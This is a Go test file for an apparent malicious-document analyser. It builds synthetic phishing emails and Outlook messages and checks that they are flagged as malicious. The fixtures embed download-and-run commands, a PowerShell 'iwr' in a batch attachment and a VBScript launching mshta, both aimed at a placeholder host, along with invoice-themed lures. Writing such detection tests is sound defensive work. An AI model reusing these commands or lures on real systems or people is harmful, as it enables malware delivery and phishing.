package maldoctrace

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/debugactiveprocess/MaldocTrace/extractor"
	"github.com/debugactiveprocess/MaldocTrace/internal/cfbtest"
	"github.com/debugactiveprocess/MaldocTrace/report"
)

func wrap76(s string) string {
	var b strings.Builder
	for len(s) > 76 {
		b.WriteString(s[:76] + "\r\n")
		s = s[76:]
	}
	return b.String() + s
}

func testEML(t *testing.T) []byte {
	docx := base64.StdEncoding.EncodeToString(templateDocx(t))
	inner := "From: inner@example.invalid\r\nSubject: inner\r\nMIME-Version: 1.0\r\n" +
		"Content-Type: multipart/mixed; boundary=\"in\"\r\n\r\n" +
		"--in\r\nContent-Type: text/plain\r\n\r\nsee attached\r\n" +
		"--in\r\nContent-Type: application/octet-stream; name=\"run.bat\"\r\nContent-Disposition: attachment; filename=\"run.bat\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n\r\n" + base64.StdEncoding.EncodeToString([]byte("@echo off\r\npowershell -nop -c iwr http://example.invalid/b\r\n")) + "\r\n--in--\r\n"
	msg := "Return-Path: <a@example.invalid>\r\nFrom: =?UTF-8?B?Q29udGFz?= <billing@example.invalid>\r\nTo: victim@example.invalid\r\n" +
		"Subject: =?UTF-8?Q?Fatura_vencida?=\r\nDate: Thu, 12 Nov 2026 10:00:00 +0000\r\nMIME-Version: 1.0\r\n" +
		"Content-Type: multipart/mixed; boundary=\"outer\"\r\n\r\npreamble\r\n" +
		"--outer\r\nContent-Type: multipart/alternative; boundary=\"alt\"\r\n\r\n" +
		"--alt\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nPague em http://example.invalid/pa=\r\ny\r\n" +
		"--alt\r\nContent-Type: text/html\r\n\r\n<a href=\"http://example.invalid/html\">x</a>\r\n--alt--\r\n" +
		"--outer\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document; name=\"fatura.docx\"\r\n" +
		"Content-Disposition: attachment; filename=\"fatura.docx\"\r\nContent-Transfer-Encoding: base64\r\n\r\n" + wrap76(docx) + "\r\n" +
		"--outer\r\nContent-Type: message/rfc822\r\nContent-Disposition: attachment; filename=\"fwd.eml\"\r\n\r\n" + inner + "\r\n" +
		"--outer--\r\n"
	return []byte(msg)
}

func TestEMLAttachmentsAnalysed(t *testing.T) {
	data := testEML(t)
	if extractor.DetectContainer(data) != "eml" {
		t.Fatal("eml not detected")
	}
	r := AnalyzeFromBytes(context.Background(), data, "fatura.eml", Options{})
	if r.Format != "eml" || r.Verdict != "malicious" {
		t.Fatalf("format %s verdict %s %v", r.Format, r.Verdict, r.VerdictReasons)
	}
	props := map[string]string{}
	for _, p := range r.Properties {
		props[p.Name] = p.Value
	}
	if props["Subject"] != "Fatura vencida" || !strings.Contains(props["From"], "billing@example.invalid") || !strings.HasPrefix(props["Attachment 1"], "fatura.docx") {
		t.Fatalf("properties %+v", props)
	}
	for _, u := range []string{"http://example.invalid/pay", "http://example.invalid/html"} {
		if !hasIOCType(r, "url", u) {
			t.Errorf("body URL %s missing: %+v", u, r.Indicators)
		}
	}
	if len(r.Children) != 2 {
		t.Fatalf("children %+v", r.Children)
	}
	var docx, fwd *report.Report
	for _, c := range r.Children {
		switch c.Name {
		case "fatura.docx":
			docx = c.Report
		case "fwd.eml":
			fwd = c.Report
		}
	}
	if docx == nil || !hasFindingSev(docx, "template_injection", "high") {
		t.Fatalf("docx attachment not analysed")
	}
	if fwd == nil || fwd.Format != "eml" || len(fwd.Commands) == 0 || fwd.Verdict != "malicious" {
		t.Fatalf("attached message not analysed: %+v", fwd)
	}
}

func u16z(s string) []byte {
	var b []byte
	for _, c := range utf16.Encode([]rune(s)) {
		b = binary.LittleEndian.AppendUint16(b, c)
	}
	return b
}

func TestMSGAttachments(t *testing.T) {
	data := cfbtest.Build(
		cfbtest.Stream{Name: "__properties_version1.0", Data: make([]byte, 32)},
		cfbtest.Stream{Name: "__substg1.0_0037001F", Data: u16z("Invoice overdue")},
		cfbtest.Stream{Name: "__substg1.0_0C1A001F", Data: u16z("Billing")},
		cfbtest.Stream{Name: "__substg1.0_0C1F001F", Data: u16z("billing@example.invalid")},
		cfbtest.Stream{Name: "__substg1.0_1000001F", Data: u16z("Pay at http://example.invalid/msgpay now")},
		cfbtest.Stream{Name: "__attach_version1.0_#00000000/__substg1.0_3707001F", Data: u16z("update.vbs")},
		// cfbtest pads streams under 4096 bytes with NULs: keep the script longer.
		cfbtest.Stream{Name: "__attach_version1.0_#00000000/__substg1.0_37010102", Data: []byte("CreateObject(\"WScript.Shell\").Run \"mshta http://example.invalid/x.hta\"\r\n' " + strings.Repeat("x", 4200))},
		cfbtest.Stream{Name: "__attach_version1.0_#00000001/__substg1.0_3707001F", Data: u16z("forwarded.msg")},
		cfbtest.Stream{Name: "__attach_version1.0_#00000001/__substg1.0_3701000D/__properties_version1.0", Data: make([]byte, 32)},
		cfbtest.Stream{Name: "__attach_version1.0_#00000001/__substg1.0_3701000D/__substg1.0_0037001F", Data: u16z("inner")},
		cfbtest.Stream{Name: "__attach_version1.0_#00000001/__substg1.0_3701000D/__attach_version1.0_#00000000/__substg1.0_3707001F", Data: u16z("notes.txt")},
		cfbtest.Stream{Name: "__attach_version1.0_#00000001/__substg1.0_3701000D/__attach_version1.0_#00000000/__substg1.0_37010102", Data: []byte("just text")},
	)
	if extractor.DetectContainer(data) != "msg" {
		t.Fatal("msg not detected")
	}
	r := AnalyzeFromBytes(context.Background(), data, "invoice.msg", Options{})
	props := map[string]string{}
	for _, p := range r.Properties {
		props[p.Name] = p.Value
	}
	if r.Format != "msg" || props["Subject"] != "Invoice overdue" || props["From"] != "Billing <billing@example.invalid>" {
		t.Fatalf("format %s props %+v", r.Format, props)
	}
	if !strings.HasPrefix(props["Attachment 2"], "forwarded.msg/notes.txt") {
		t.Fatalf("embedded message attachment: %+v", props)
	}
	if r.Verdict != "malicious" || !hasFindingSev(r, "embedded_script", "high") || !hasIOCType(r, "url", "http://example.invalid/msgpay") {
		t.Fatalf("verdict %s findings %+v iocs %+v", r.Verdict, r.StaticFindings, r.Indicators)
	}
}

func FuzzEmail(f *testing.F) {
	f.Add([]byte("From: a@example.invalid\r\nTo: b\r\nSubject: s\r\nContent-Type: multipart/mixed; boundary=x\r\n\r\n--x\r\nContent-Type: text/plain\r\n\r\nhi\r\n--x--\r\n"))
	f.Fuzz(func(t *testing.T, b []byte) {
		if extractor.DetectContainer(b) == "eml" {
			extractor.ParseEML(b)
		}
		extractor.ParseMSG(b, nil)
	})
}
